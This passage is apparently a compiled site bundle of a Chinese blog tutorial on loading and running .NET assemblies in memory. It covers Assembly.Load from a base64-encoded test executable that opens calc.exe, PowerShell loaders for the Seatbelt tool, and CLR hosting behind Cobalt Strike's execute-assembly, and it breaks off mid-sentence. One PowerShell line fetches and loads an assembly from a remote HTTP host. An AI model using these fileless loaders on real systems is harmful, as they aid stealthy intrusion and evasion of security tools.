import{_ as i}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as t,o as l,c as d,a as n,b as a,d as s,e}from"./app-A13fm91_.js";const c="/DailyNotes/assets/image-20220114182430780-16443915545351-_ycJm77U.png",o="/DailyNotes/assets/image-20220114182256752-w0y70tir.png",u="/DailyNotes/assets/image-20220209135538841-3zwi8aV4.png",r="/DailyNotes/assets/image-20220117192352767-i2yWebVm.png",p={},v=e(`<h1 id="内存加载执行文件的方法" tabindex="-1"><a class="header-anchor" href="#内存加载执行文件的方法" aria-hidden="true">#</a> 内存加载执行文件的方法</h1><p>分两部分：</p><ul><li>.NET程序集</li><li>PE文件</li></ul><h2 id="_0-执行本地文件" tabindex="-1"><a class="header-anchor" href="#_0-执行本地文件" aria-hidden="true">#</a> 0. 执行本地文件</h2><p>此处以C#和C++为例：AI都会写</p><h3 id="exe" tabindex="-1"><a class="header-anchor" href="#exe" aria-hidden="true">#</a> exe</h3><p>在C#中执行一个<code>.exe</code>文件可以使用<code>Process</code>类，</p><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        Process.Start(&quot;C:\\\\file.exe&quot;);
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>而在C++中可以使用<code>CreateProcess</code>函数。</p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>#include &lt;windows.h&gt;

int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&amp;si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&amp;pi, sizeof(pi));

    // Start the child process.
    if (!CreateProcess(NULL, &quot;C:\\\\file.exe&quot;, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))
    {
        printf(&quot;CreateProcess failed (%d).\\n&quot;, GetLastError());
        return 1;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="dll" tabindex="-1"><a class="header-anchor" href="#dll" aria-hidden="true">#</a> dll</h3><p>在C#中执行一个<code>.dll</code>文件通常涉及在应用程序中加载并调用该<code>.dll</code>中的函数。</p><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport(&quot;C:\\\\dll_file.dll&quot;)]
    public static extern void YourFunction(); // 假设要调用的函数没有返回值

    static void Main()
    {
        YourFunction(); // 调用从DLL中导入的函数
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在C++中执行一个<code>.dll</code>文件通常是通过加载动态链接库并调用其中的函数。</p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>#include &lt;windows.h&gt;

typedef void (*YourFunction)(); // 假设要调用的函数没有返回值

int main()
{
    HINSTANCE hDLL = LoadLibrary(&quot;C:\\\\dll_file.dll&quot;);
    if (hDLL != NULL)
    {
        YourFunction yourFunction = (YourFunction)GetProcAddress(hDLL, &quot;YourFunction&quot;);
        if (yourFunction != NULL)
        {
            yourFunction(); // 调用从DLL中导入的函数
        }
        else
        {
            // 处理函数加载失败的情况
        }
        FreeLibrary(hDLL);
    }
    else
    {
        // 处理DLL加载失败的情况
    }

    return 0;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_1-managed代码内存加载-net程序集" tabindex="-1"><a class="header-anchor" href="#_1-managed代码内存加载-net程序集" aria-hidden="true">#</a> 1. managed代码内存加载.NET程序集</h2><p><strong>(Assembly.Load)</strong></p><p>使用C#从内存中加载.NET程序集，直接用<code>Assembly.Load</code>就行了。</p>`,18),m={href:"https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5",target:"_blank",rel:"noopener noreferrer"},b=e(`<h3 id="_1-1-三种load的区别" tabindex="-1"><a class="header-anchor" href="#_1-1-三种load的区别" aria-hidden="true">#</a> 1.1. 三种Load的区别</h3><p><strong><code>Assembly.Load()</code>、<code>Assembly.LoadFrom()</code>和<code>Assembly.LoadFile()</code></strong></p><ul><li><p><code>Assembly.Load()</code>是从String或AssemblyName类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘</p></li><li><p><code>Assembly.LoadFrom()</code>从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集，例如：<code>Assembly.LoadFrom(&quot;a.dll&quot;)</code>，如果a.dll中引用了b.dll，那么会同时加载a.dll和b.dll</p></li><li><p><code>Assembly.LoadFile()</code>也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集，例如：<code>Assembly.LoadFile(&quot;a.dll&quot;)</code>，如果a.dll中引用了b.dll，那么不会加载b.dll</p></li></ul><h3 id="_1-2-c-反射加载流程" tabindex="-1"><a class="header-anchor" href="#_1-2-c-反射加载流程" aria-hidden="true">#</a> 1.2. C#反射加载流程</h3><p><strong>(1) 编写测试程序</strong></p><p>测试程序的代码如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>using System;
namespace TestApplication
{
	public class Program
	{
    		public static void Main()
    		{
        		Console.WriteLine(&quot;Main&quot;);
    		}
	}
	public class aaa
	{
    		public static void bbb()
    		{
        		System.Diagnostics.Process p = new System.Diagnostics.Process();
        		p.StartInfo.FileName = &quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;;
        		p.Start();
    		}
	}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用csc.exe进行编译：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:testcalc.exe test.cs
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>生成testcalc.exe</p><p><strong>(2) 测试的.exe作base64编码</strong></p><p>代码如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>using System;
using System.Reflection;
namespace TestApplication
{
    public class Program
    {
        public static void Main()
        {

            byte[] buffer = System.IO.File.ReadAllBytes(&quot;testcalc.exe&quot;);
            string base64str = Convert.ToBase64String(buffer);
            Console.WriteLine(base64str);
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>(3) 还原.exe的内容</strong></p><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;
using System.Reflection;
namespace TestApplication
{
    public class Program
    {
        public static void Main()
        {

            string base64str = &quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAFxbrV0AAAAAAAAAAOAAAgELAQsAAAYAAAAIAAAAAAAAfiQAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAACQkAABXAAAAAEAAAOAEAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAhAQAAAAgAAAABgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAOAEAAAAQAAAAAYAAAAIAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABgJAAAAAAAAEgAAAACAAUAnCAAAIgDAAABAAAAAQAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADYAcgEAAHAoAwAACgAqHgIoBAAACioAABMwAgAgAAAAAQAAEQBzBQAACgoGbwYAAApyCwAAcG8HAAAKAAZvCAAACiYqHgIoBAAACipCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAABMAQAAI34AALgBAAAgAQAAI1N0cmluZ3MAAAAA2AIAAEgAAAAjVVMAIAMAABAAAAAjR1VJRAAAADADAABYAAAAI0Jsb2IAAAAAAAAAAgAAAUcUAgAJAAAAAPolMwAWAAABAAAABgAAAAMAAAAEAAAACAAAAAIAAAABAAAAAQAAAAIAAAAAAAoAAQAAAAAABgBDADwABgB5AFkABgCZAFkABgDAADwACgDlANIACgDtANIAAAAAAAEAAAAAAAEAAQABABAAFwAfAAUAAQABAAEAEAAvAB8ABQABAAMAUCAAAAAAlgBKAAoAAQBeIAAAAACGGE8ADgABAGggAAAAAJYAVQAKAAEAlCAAAAAAhhhPAA4AAQARAE8AEgAZAE8ADgAhAMgAFwAJAE8ADgApAE8ADgApAP4AHAAxAAwBIQApABkBJgAuAAsALwAuABMAOAAqAASAAAAAAAAAAAAAAAAAAAAAALcAAAAEAAAAAAAAAAAAAAABADMAAAAAAAQAAAAAAAAAAAAAAAEAPAAAAAAAAAAAAAA8TW9kdWxlPgB0ZXN0Y2FsYy5leGUAUHJvZ3JhbQBUZXN0QXBwbGljYXRpb24AYWFhAG1zY29ybGliAFN5c3RlbQBPYmplY3QATWFpbgAuY3RvcgBiYmIAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHRlc3RjYWxjAENvbnNvbGUAV3JpdGVMaW5lAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUAU3RhcnQAAAAJTQBhAGkAbgAAOWMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAGEAbABjAC4AZQB4AGUAAAAAAIp9qiotKj5BiasEfftgNuEACLd6XFYZNOCJAwAAAQMgAAEEIAEBCAQAAQEOBCAAEhkEIAEBDgMgAAIEBwESFQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEATCQAAAAAAAAAAAAAbiQAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAkAAAAAAAAAAAAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAEAAAACAAAIAYAAAAOAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAUAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAaAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAkAAAAKBAAABMAgAAAAAAAAAAAADwQgAA6gEAAAAAAAAAAAAATAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBKwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAIgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAuADAALgAwAAAAPAANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAAB0AGUAcwB0AGMAYQBsAGMALgBlAHgAZQAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEQADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAB0AGUAcwB0AGMAYQBsAGMALgBlAHgAZQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAIA0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==&quot;;
            byte[] buffer = Convert.FromBase64String(base64str);

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>(4) 使用Assembly.Load()加载程序集并调用方法</strong></p><p>代码如下：</p><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;
using System.Reflection;
namespace TestApplication
{
    public class Program
    {
        public static void Main()
        {

            string base64str = &quot;egrdersg&quot;;//这里省略一下
            byte[] buffer = Convert.FromBase64String(base64str);

            Assembly assembly = Assembly.Load(buffer);          
            Type type = assembly.GetType(&quot;TestApplication.aaa&quot;);
            MethodInfo method = type.GetMethod(&quot;bbb&quot;);
            Object obj = assembly.CreateInstance(method.Name);            
            method.Invoke(obj, null);
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果不需要指定需要调用的方法，调用main函数即可：</p><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;
using System.Reflection;
namespace TestApplication
{
    public class Program
    {
        public static void Main()
        {

            string base64str = &quot;xxxxxx&quot;; //此处省略一万字
            byte[] buffer = Convert.FromBase64String(base64str);

            Assembly assembly = Assembly.Load(buffer);
            MethodInfo method = assembly.EntryPoint;
            // 想要指定参数
            object[] parameters = new[] {&quot;-a&quot;,&quot;-b&quot;};
            method.Invoke(null, parameters);
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-3-示例代码" tabindex="-1"><a class="header-anchor" href="#_1-3-示例代码" aria-hidden="true">#</a> 1.3. 示例代码</h3><h4 id="c" tabindex="-1"><a class="header-anchor" href="#c" aria-hidden="true">#</a> c#</h4><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;
using System.IO;
using System.Reflection;

namespace MemoryLoadApplication
{

    class Program
    {

        static void Main(string[] args)
        {

            byte[] buffer = File.ReadAllBytes(@&quot;C:\\Users\\Black Sheep\\source\\repos\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe&quot;);
            string base64str = Convert.ToBase64String(buffer);
            string dir = Directory.GetCurrentDirectory();
            buffer = Convert.FromBase64String(base64str);
            File.WriteAllText($&quot;{dir}\\\\base64.txt&quot;, base64str);
            Assembly assembly = System.Reflection.Assembly.Load(buffer);
            assembly.EntryPoint.Invoke(null, new object[] { args });

        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="powershell" tabindex="-1"><a class="header-anchor" href="#powershell" aria-hidden="true">#</a> powershell</h4><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token variable">$base64</span> = <span class="token string">&quot;TVqQAAMAAAAEAAA(前面生成的base64编码的程序集)&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$bins</span>  = <span class="token namespace">[System.Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$invoke</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$bins</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token namespace">[System.Console]</span>::WriteLine<span class="token punctuation">(</span><span class="token variable">$invoke</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$args</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>ArrayList

<span class="token namespace">[string[]]</span><span class="token variable">$strings</span> = <span class="token string">&quot;-group=all&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;-full&quot;</span>

<span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token variable">$strings</span><span class="token punctuation">)</span>

<span class="token variable">$invoke</span><span class="token punctuation">.</span>EntryPoint<span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$N</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">.</span>ToArray<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以远程加载</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token variable">$invoke</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::UnsafeLoadFrom<span class="token punctuation">(</span><span class="token string">&quot;http://192.168.0.125/base&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="_2-unmanaged代码内存加载-net程序集" tabindex="-1"><a class="header-anchor" href="#_2-unmanaged代码内存加载-net程序集" aria-hidden="true">#</a> 2. unmanaged代码内存加载.NET程序集</h2><p><strong>(execute-assembly)</strong></p><p>当不是用C#编写代码，但还是想要实现上面的操作时，例如Cobalt Strike 3.11中，加入了一个名为”execute-assembly”的命令，能够从内存中加载.NET程序集。<code>execute-assembly</code>功能的实现，必须使用一些来自.NET Framework的核心接口来执行.NET程序集口</p><h3 id="_2-1-基础知识" tabindex="-1"><a class="header-anchor" href="#_2-1-基础知识" aria-hidden="true">#</a> 2.1. 基础知识</h3><p>CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境</p><p>CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：</p><ul><li>在CLR监视之下运行的程序属于”托管的”(managed)代码</li><li>不在CLR之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码</li></ul><p><strong>Hosting</strong> (Unmanaged API Reference) 用于将.NET 程序集加载到任意程序中的API（https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/ ）本次主要关注两种方式，按照.net版本区分：</p><ul><li><p><strong>ICorRuntimeHost Interface</strong>：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/icorruntimehost-interface</p><p>支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319</p></li><li><p><strong>ICLRRuntimeHost Interface</strong>：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface</p><p>支持v2.0.50727和v4.0.30319，在.NET Framework 2.0中，ICLRRuntimeHost用于取代ICorRuntimeHost，在实际程序开发中，很少会考虑.NET Framework 1.0，所以两个接口都可以使用</p></li></ul><h4 id="重要接口描述" tabindex="-1"><a class="header-anchor" href="#重要接口描述" aria-hidden="true">#</a> 重要接口描述</h4><p><code>ICLRRuntimeHost</code>、<code>ICLRRuntimeInfo</code> 以及<code>ICLRMetaHost</code> ，以下是这三个接口的简要描述</p>`,38),g={href:"https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface",target:"_blank",rel:"noopener noreferrer"},k=e('<ul><li><strong>ICLRMetaHost</strong>: 这个接口用于在托管代码中获取关于加载的CLR（Common Language Runtime，.NET Framework的核心组件）的信息。基本上，它提供了一个入口点，允许我们枚举加载到进程中的所有CLR版本，并为特定版本的CLR获取<code>ICLRRuntimeInfo</code>接口。</li><li><strong>ICLRRuntimeInfo</strong>: 一旦你有了表示特定CLR版本的<code>ICLRRuntimeInfo</code>接口，你可以用它来获取CLR运行时的其他接口，例如<code>ICLRRuntimeHost</code>。这个接口还允许你判断这个特定版本的CLR是否已经被加载到进程中。</li><li><strong>ICLRRuntimeHost</strong>: 这是执行.NET程序集所必需的主要接口。通过这个接口，你可以启动托管代码的执行环境，加载.NET程序集，并执行它。具体来说，它的<code>ExecuteInDefaultAppDomain</code>方法可以用来加载和执行.NET程序集。</li></ul><p>综上所述，要在非托管代码（如C++）中执行.NET程序集，你需要首先使用<code>ICLRMetaHost</code>来确定哪个CLR版本已加载或可用。然后使用<code>ICLRRuntimeInfo</code>来为这个CLR版本获取<code>ICLRRuntimeHost</code>。最后用<code>ICLRRuntimeHost</code>来加载和执行.NET程序集。</p><h3 id="_2-2-cs内存执行流程分析" tabindex="-1"><a class="header-anchor" href="#_2-2-cs内存执行流程分析" aria-hidden="true">#</a> 2.2. CS内存执行流程分析</h3><p>在Cobalt 